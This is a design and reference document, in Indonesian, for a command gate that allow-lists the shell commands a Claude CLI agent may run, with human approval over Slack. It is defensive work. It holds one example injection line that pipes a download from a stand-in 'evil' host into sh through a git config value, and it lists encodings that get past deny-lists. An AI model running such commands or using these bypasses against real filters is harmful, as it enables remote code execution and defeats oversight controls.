# Command Gate — Arsitektur & Reference

Dokumen ini menjelaskan arsitektur `wick-gate` dan menamai teknik-teknik
yang dipakai sehingga kamu bisa baca dokumentasi resmi langsung dari
sumber primer (Anthropic, OpenAI, Google, POSIX). Fokus: **kenapa**
desain dipilih dan **istilah teknis** yang harus dicari kalau mau
research lebih dalam.

Untuk implementasi konkret + roadmap, lihat
[agents-design.md §4.5](./agents-design.md).

---

## 1. Konteks Singkat

`wick serve` (daemon) men-spawn `claude` CLI sebagai subprocess long-lived.
Setiap kali claude mau menjalankan tool `Bash`, dia memanggil
`wick-gate` untuk minta keputusan allow / block. `wick-gate`:

1. Baca whitelist rules dari file (`$WICK_GATE_SPEC`)
2. Baca command dari stdin (claude yang kirim)
3. Match rules → keputusan
4. Append log → `commands.jsonl`
5. Exit 0 (allow) atau exit 2 (block)

Claude tangkap exit code → eksekusi atau cancel tool.

---

## 2. Nama Teknik (Untuk Riset Lanjutan)

Daftar nama-istilah yang relevan plus link dokumentasi resmi.

### 2.1 Pre-execution Hook / Tool Approval Hook

Mekanisme di mana CLI / runtime memanggil program eksternal sebelum
mengeksekusi sebuah tool, dan keputusan eksekusi ditentukan oleh exit
code atau output program eksternal tersebut.

| CLI | Nama Hook | Cara Block | Docs |
|-----|-----------|------------|------|
| Claude CLI | `PreToolUse` | exit code `2` | https://code.claude.com/docs/en/hooks-guide |
| Codex CLI | `PermissionRequest` | stdout JSON `{"behavior":"deny"}` | https://developers.openai.com/codex/hooks |
| Gemini CLI | `BeforeTool` | stdout JSON deny | https://geminicli.com/docs/hooks/ |

Istilah generik di literatur: **policy hook**, **callout policy**,
**admission control**, **interception hook**, **out-of-band approval**.

### 2.2 Sidecar Authorization / Out-of-Process Policy Decision

Pola umum: process utama delegasi keputusan otorisasi ke proses kecil
terpisah. Inspirasi dari Kubernetes admission webhooks dan OPA
(Open Policy Agent).

- **OPA Sidecar Pattern** — https://www.openpolicyagent.org/docs/latest/external-data/
- **Kubernetes Admission Controllers** — https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/
- **PEP / PDP split** (Policy Enforcement Point vs Policy Decision Point) — XACML standard:
  https://docs.oasis-open.org/xacml/3.0/xacml-3.0-core-spec-os-en.html

Di wick: claude = PEP (yang enforce), wick-gate = PDP (yang decide).

### 2.3 Stateless Helper Binary / "Worker-Pattern"

Binary kecil tanpa state, dipanggil per-event, hidup detik-an, exit. Lawan
dari long-running daemon.

Istilah:

- **Stateless ephemeral process** — semua state lewat env / args / stdin
- **CGI-style invocation** — pola lama dari web: per-request fork+exec.
  Reference: https://datatracker.ietf.org/doc/html/rfc3875
- **Run-to-completion process** — kontras dgn long-running process

### 2.4 Process I/O Channel (UNIX-style IPC)

Kontrak komunikasi antara claude dan wick-gate **bukan** RPC/HTTP/socket,
melainkan kombinasi primitive POSIX standar:

| Channel | Arah | Isi |
|---|---|---|
| **Environment variables** | parent → child | `WICK_GATE_SPEC=<path>` |
| **stdin pipe** | parent → child | JSON payload |
| **stdout pipe** | child → parent | (tidak dipakai claude PreToolUse) |
| **stderr pipe** | child → parent | reason string (di-pass ke model) |
| **Exit code** | child → parent | 0 = allow, 2 = block |
| **Filesystem** | side-channel | append `commands.jsonl` (log) |

Reference (POSIX semantics):

- `fork(2)`, `execve(2)`, `pipe(2)`, `dup2(2)`, `waitpid(2)` — `man 2`
- Go wrapper: `exec.Cmd` — https://pkg.go.dev/os/exec
- Konsep "12-Factor Process" untuk stateless binary —
  https://12factor.net/processes

### 2.5 Bypass-Permissions / Headless CLI Mode

Mode di mana CLI menonaktifkan interactive approval prompt sehingga
hook-lah yang menjadi authority.

- Claude: `--permission-mode bypassPermissions`
  → docs: https://code.claude.com/docs/en/cli-reference
- Konsep generik: **non-interactive mode**, **batch mode**, **headless mode**

### 2.6 Allow-list / Deny-by-Default

Pola keamanan: hanya yg explicit di whitelist yg boleh; semua lainnya
otomatis block. Lawan dari blacklist (deny-list).

- OWASP — https://owasp.org/www-community/Allow_list_(or_whitelist)
- "Default deny" = posture di firewall / IAM

### 2.7 Shell Metachar Sanitization

Bahkan kalau "git *" allowed, command `git -c core.editor='curl evil | sh'`
tetap berbahaya karena `|` adalah shell metacharacter. wick-gate
reject early kalau ada `;|&` <code>`</code> `<>$\n\r`.

Riset:
- OWASP Command Injection — https://owasp.org/www-community/attacks/Command_Injection
- CWE-78 — https://cwe.mitre.org/data/definitions/78.html

### 2.8 Async Approval / Human-in-the-Loop Authorization

Untuk approval yg butuh tunggu manusia (Slack button, dashboard click),
proses sync hook **tidak boleh** hold lama. Solusinya:

- **Polling pattern** — gate poll daemon dgn timeout
- **Long-polling / SSE** — daemon hold koneksi sampai ada keputusan
- **Webhook callback** — Slack interactive component dgn `response_url`
  https://api.slack.com/interactivity/handling

Konsep generik:

- **Human-in-the-loop authorization (HITL)**
- **Out-of-band approval channel**
- **Step-up authentication** — minta approval ekstra hanya untuk operasi
  sensitif

---

## 3. Pertanyaan Desain Inti

### 3.1 Kenapa Pre-Execution Hook (bukan post-exec audit)?

- **Pre-exec**: command **belum jalan** saat hook fire. Block = command
  ngak pernah jalan. Aman.
- **Post-exec audit**: command sudah jalan, hook cuma rekam. Blast
  radius sudah terjadi. Tidak aman utk destructive ops.

Hook claude `PreToolUse` adalah pre-exec. Ada juga `PostToolUse` (audit).

### 3.2 Kenapa Stateless Binary (bukan persistent daemon)?

| Aspek | Stateless Binary | Persistent Daemon |
|---|---|---|
| Cold start | ~10-50ms (acceptable) | <1ms |
| Crash recovery | Trivial (proses baru) | Restart daemon, in-flight state hilang |
| Lock / race | None (proses isolasi) | Harus handle concurrency |
| State sync | File spec.json (atomic via OS) | IPC primitive |
| Test | Subprocess murni, no fixture | Butuh setup / teardown daemon |
| Filosofi | UNIX "do one thing well" | Server-style |

Per Bash call ~10-50 invoke per session. Total overhead < 1 detik. Trade
performance microscopic untuk simplicity besar.

### 3.3 Kenapa Whitelist (bukan Blacklist)?

Blacklist gampang di-bypass:

- Alias: `alias rm=remove`
- Path absolut: `/usr/bin/rm` vs `rm`
- Encoding: `r\m`, `${BASH_VERSION:0:0}rm`
- Built-in vs binary: `rm` shell builtin vs `/bin/rm`

Whitelist + shell-metachar guard = surface area kecil, default deny.

### 3.4 Kenapa Authority di Hook (bukan di Claude)?

Default claude minta approval interactive ke TTY. Subprocess wick **tidak
punya TTY** → prompt nge-block selamanya. Solusi:

- `--permission-mode bypassPermissions` matikan TTY prompt
- `PreToolUse` hook jadi authority

Trade-off: claude ngak nanya user lagi, wick yg decide. Untuk wick yg
single-user dev tool, ini OK karena user yg sama yg config rules.

### 3.5 Kenapa Pisah Binary `wick-gate` (bukan subcommand `wick gate`)?

**Pertanyaan terbuka.** Argumen pro/kontra:

**Pisah binary kecil** ✅ _saat ini di codebase_:

- 1 cmd 1 binary (UNIX filosofi)
- Cold start absolut paling cepat (binary kecil)
- Test isolation bersih (compile binary, jalankan, no shared init)
- Crash daemon ≠ crash gate (independent)

**Subcommand `wick gate`**:

- 1 binary distribusi (1 file ship)
- Auto-resolve path via `os.Executable()` (no PATH lookup, no config)
- Bisa pakai paket internal wick (Slack transport, configs, db) **kalau**
  butuh approval async
- Cold start ~50ms (binary monolith ~50MB) — perlu short-circuit di
  `main.go` agar paket berat tidak ke-init utk subcommand `gate`

Lihat §4 utk **decision matrix** kalau approval async (Slack) jadi
requirement.

---

## 4. Async Approval — Technical Pattern

Saat rule whitelist tidak cukup (mis. command ad-hoc), butuh approval
manusia via Slack/web. Hook **tidak boleh** hold lama (claude punya
hook timeout).

### 4.1 Pilihan Pola

#### Pola A — Hook Hold + Local IPC

```
claude → wick-gate (sub/pisah)
         ├─ rule.match → exit 0/2
         └─ rule.miss + ask_on_block:
               → HTTP POST localhost:9425/api/agents/approve
                   {session_id, cmd, timeout: 30s}
               wick serve (daemon):
                 ├─ kirim Slack interactive message
                 ├─ tunggu Slack response_url callback
                 ├─ resolve → respond
               ← HTTP response: {decision: "approve"}
         exit 0/2
```

**Pro**: simpel, gate tipis tetep, daemon pegang state Slack.
**Kontra**: gate hold sampai timeout. Claude hook timeout ~60s default.

Reference Slack interactive: https://api.slack.com/interactivity/actions

#### Pola B — Async Defer + Re-prompt

```
gate.miss → respond block dgn reason "pending approval"
          → daemon emit Slack message
user click approve → daemon update spec / cache
next time claude retry command → gate cek cache → allow
```

**Pro**: hook ngak hold.
**Kontra**: butuh retry loop di prompt agent ("kalau diblok dengan reason
'pending', tunggu dan coba lagi"). Lebih complex agent-side.

#### Pola C — Daemon-Embedded Gate (no separate process)

Gate logic jadi **library di dalam daemon**, claude ngak fire ke binary
external — `wick serve` listen ke claude lewat custom transport (mis.
pipe yg parent control langsung).

**Pro**: zero-spawn.
**Kontra**: claude hook protocol tidak support ini saat ini. Harus pake
hook = harus exec binary.

### 4.2 Implikasi Pisah vs Gabung untuk Approval

| Pilihan | Approval Otomatis | Approval Slack |
|---|---|---|
| Pisah binary kecil | Cek rule lokal, exit | HTTP IPC ke daemon (Pola A) |
| Subcommand `wick gate` | Cek rule lokal, exit | HTTP IPC ke daemon (Pola A) atau init paket Slack langsung (heavy per invoke) |

**Insight**: utk Pola A, pisah vs gabung ngak ngaruh — keduanya tetep
HTTP ke daemon. Daemon jadi PDP central, gate cuma transport.

Refactor opportunity: extract daemon endpoint `/api/agents/approve` jadi
**centralized PDP**. Gate (apapun bentuknya) cuma RPC client.

---

## 5. Glossary

| Istilah | Arti |
|---|---|
| PEP — Policy Enforcement Point | Yang enforce keputusan (claude) |
| PDP — Policy Decision Point | Yang bikin keputusan (wick-gate) |
| PreToolUse hook | Hook claude yg fire sebelum tool execution |
| `bypassPermissions` mode | Claude mode yg matikan interactive approval |
| Spec file | `spec.json` berisi rules + paths, dibaca via env var |
| Allow-list | Whitelist yg explicit, default-deny |
| Shell metachar | Char yg trigger shell parsing: `; \| & \` < > $ \n \r` |
| HITL | Human-in-the-loop authorization |
| Sidecar | Proses pendamping yg jalan parallel dgn proses utama |
| Stateless binary | Binary tanpa state internal, semua via env/stdin/file |
| Cold start | Waktu dari spawn sampai siap eksekusi logic |

---

## 6. Bacaan Lanjutan (Urutan Rekomendasi)

1. **Claude hooks-guide** — paling relevan langsung:
   https://code.claude.com/docs/en/hooks-guide
2. **OPA — Open Policy Agent** — pola sidecar PDP:
   https://www.openpolicyagent.org/docs/latest/
3. **OWASP Command Injection** — kenapa shell metachar bahaya:
   https://owasp.org/www-community/attacks/Command_Injection
4. **Slack interactivity** — kalau mau implement Pola A approval:
   https://api.slack.com/interactivity/handling
5. **12-Factor — Processes** — filosofi stateless binary:
   https://12factor.net/processes
6. **XACML PEP/PDP** — istilah formal:
   https://docs.oasis-open.org/xacml/3.0/xacml-3.0-core-spec-os-en.html
7. **CGI RFC 3875** — pola "spawn per event" dari era web lama (mirip
   wick-gate): https://datatracker.ietf.org/doc/html/rfc3875

---

## 7. Apa Yang Sudah / Belum Diimplement

Lihat [agents-design.md §1 Phase 3](./agents-design.md) untuk checklist
formal. Ringkas:

- ✅ Matcher + glob + scope + metachar guard
- ✅ `wick-gate` binary
- ✅ `commands.jsonl` log
- ✅ Settings.json generator
- ❌ Wiring `factory.Gate` di `wick serve` (saat ini `nil`)
- ❌ Default whitelist rules
- ❌ Path resolver buat hook command
- ❌ Async approval via Slack (Pola A/B/C — belum pilih)
